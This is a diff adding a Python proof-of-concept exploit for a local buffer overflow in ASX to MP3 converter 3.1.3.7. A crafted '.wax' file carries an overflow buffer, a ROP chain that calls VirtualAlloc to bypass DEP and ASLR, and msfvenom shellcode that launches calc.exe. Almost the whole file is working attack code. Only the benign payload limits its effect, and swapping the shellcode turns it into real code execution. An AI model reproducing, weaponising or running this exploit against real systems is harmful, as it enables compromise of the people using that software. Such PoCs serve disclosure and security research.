@@ -1,0 +1,133 @@
+# Exploit Title: ASX to MP3 converter 3.1.3.7.2010.11.05 - '.wax' Local Buffer Overflow (DEP,ASLR Bypass) (PoC) 
+# Software Link Download: https://github.com/x00x00x00x00/ASXtoMP3Converter_3.1.3.7.2010.11.05/blob/master/ASXtoMP3Converter_3.1.3.7.2010.11.05.exe?raw=true
+# Exploit Author: Paras Bhatia
+# Discovery Date: 2020-08-25
+# Vulnerable Software: ASX to MP3 converter
+# Version: 3.1.3.7.2010.11.05
+# Vulnerability Type: Local Buffer Overflow
+# Tested on: Windows 7 Ultimate Service Pack 1 (32 bit - English)  
+
+# Proof of Concept :
+
+#   1.- Run python code: asx_to_mp3_rop_exploit.py
+#   2.- Works on DEP enabled for ASX2MP3Converter.exe
+#   3.- Open "ASX2MP3Converter.exe"
+#   4.- Click on "Load" Button 
+#   5.- Select generated file "asx_to_mp3_rop_exploit.wax".
+#   6.- Click on "Open".
+#   7.- Calc.exe runs.
+
+
+#################################################################################################################################################
+
+#Python "asx_to_mp3_rop_exploit.py" Code:
+
+import struct
+file = 'asx_to_mp3_rop_exploit.wax'
+
+
+payload = "http://"
+payload += "A" * 17417 + struct.pack('<L', 0x10010C8A) + "CCCC"
+
+
+## msfvenom -a x86 -p windows/exec cmd=calc -b "\x00\x0a\x09" -f python
+
+buf =  ""
+buf += "\xbe\x4b\xe7\x94\x8c\xdb\xcd\xd9\x74\x24\xf4\x5a\x33"
+buf += "\xc9\xb1\x30\x31\x72\x13\x03\x72\x13\x83\xea\xb7\x05"
+buf += "\x61\x70\xaf\x48\x8a\x89\x2f\x2d\x02\x6c\x1e\x6d\x70"
+buf += "\xe4\x30\x5d\xf2\xa8\xbc\x16\x56\x59\x37\x5a\x7f\x6e"
+buf += "\xf0\xd1\x59\x41\x01\x49\x99\xc0\x81\x90\xce\x22\xb8"
+buf += "\x5a\x03\x22\xfd\x87\xee\x76\x56\xc3\x5d\x67\xd3\x99"
+buf += "\x5d\x0c\xaf\x0c\xe6\xf1\x67\x2e\xc7\xa7\xfc\x69\xc7"
+buf += "\x46\xd1\x01\x4e\x51\x36\x2f\x18\xea\x8c\xdb\x9b\x3a"
+buf += "\xdd\x24\x37\x03\xd2\xd6\x49\x43\xd4\x08\x3c\xbd\x27"
+buf += "\xb4\x47\x7a\x5a\x62\xcd\x99\xfc\xe1\x75\x46\xfd\x26"
+buf += "\xe3\x0d\xf1\x83\x67\x49\x15\x15\xab\xe1\x21\x9e\x4a"
+buf += "\x26\xa0\xe4\x68\xe2\xe9\xbf\x11\xb3\x57\x11\x2d\xa3"
+buf += "\x38\xce\x8b\xaf\xd4\x1b\xa6\xed\xb2\xda\x34\x88\xf0"
+buf += "\xdd\x46\x93\xa4\xb5\x77\x18\x2b\xc1\x87\xcb\x08\x3d"
+buf += "\xc2\x56\x38\xd6\x8b\x02\x79\xbb\x2b\xf9\xbd\xc2\xaf"
+buf += "\x08\x3d\x31\xaf\x78\x38\x7d\x77\x90\x30\xee\x12\x96"
+buf += "\xe7\x0f\x37\xf5\x66\x9c\xdb\xfa"
+
+
+
+## Save allocation type (0x1000) in EDX
+payload += struct.pack('<L', 0x10047F4D) # ADC EDX,ESI # POP ESI # RETN
+payload += struct.pack('<L', 0x11112112)
+payload += struct.pack('<L', 0x10029B8C) # XOR EDX,EDX # RETN
+payload += struct.pack('<L', 0x1002D493) # POP EDX # RETN
+payload += struct.pack('<L', 0xEEEEEEEE)
+payload += struct.pack('<L', 0x10047F4D) # ADC EDX,ESI # POP ESI # RETN
+payload += struct.pack('<L', 0x41414141)
+
+
+## Save the address of VirtualAlloc() in ESI
+payload += struct.pack('<L', 0x1002fade) # POP EAX # RETN  
+payload += struct.pack('<L', 0x1004f060) # ptr to &VirtualAlloc() 
+payload += struct.pack('<L', 0x1003239f) # MOV EAX,DWORD PTR DS:[EAX] # RETN 
+payload += struct.pack('<L', 0x10040754) # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN
+payload += struct.pack('<L', 0x41414141)
+payload += struct.pack('<L', 0x41414141)
+
+
+## Save the size of the block in EBX
+payload += struct.pack('<L', 0x1004d881) # XOR EAX,EAX # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
+payload += struct.pack('<L', 0x10034735) # PUSH EAX # ADD AL,5D # MOV EAX,1 # POP EBX # RETN
+
+
+
+## Save the address of esp in EBP
+payload += struct.pack('<L', 0x10031c6c) # POP EBP # RETN
+payload += struct.pack('<L', 0x10012316) # ADD ESP,8 # RETN
+
+
+
+##Save memory protection code (0x40) in ECX
+payload += struct.pack('<L',0x1002e16c)   # POP ECX # RETN   
+payload += struct.pack('<L',0xffffffff)
+payload += struct.pack('<L',0x10031ebe)   # INC ECX # AND EAX,8 # RETN  
+payload += struct.pack('<L',0x10031ebe)   # INC ECX # AND EAX,8 # RETN    
+payload += struct.pack('<L',0x1002a5b7)   # ADD ECX,ECX # RETN
+payload += struct.pack('<L',0x1002a5b7)   # ADD ECX,ECX # RETN
+payload += struct.pack('<L',0x1002a5b7)   # ADD ECX,ECX # RETN
+payload += struct.pack('<L',0x1002a5b7)   # ADD ECX,ECX # RETN
+payload += struct.pack('<L',0x1002a5b7)   # ADD ECX,ECX # RETN
+payload += struct.pack('<L',0x1002a5b7)   # ADD ECX,ECX # RETN
+
+
+## Save ROP-NOP in EDI
+payload += struct.pack('<L', 0x1002e346) # POP EDI # RETN
+payload += struct.pack('<L', 0x10010C8A) # RETN
+
+
+
+
+## Set up the EAX register to contain the address of # PUSHAD #RETN and JMP to this address
+payload += struct.pack('<L', 0x1002E516) # POP EAX # RETN
+payload += struct.pack('<L', 0xA4E2F275)
+payload += struct.pack('<L', 0x1003efe2) # ADD EAX,5B5D5E5F # RETN
+payload += struct.pack('<L', 0x10040ce5) # PUSH EAX # RETN
+
+
+
+payload += "\x90" * 4
+payload += struct.pack('<L', 0x1003df73) # & PUSH ESP # RETN
+payload += "\x90" * 20
+payload += buf
+
+
+
+f = open(file,'w')
+f.write(payload)
+f.close()
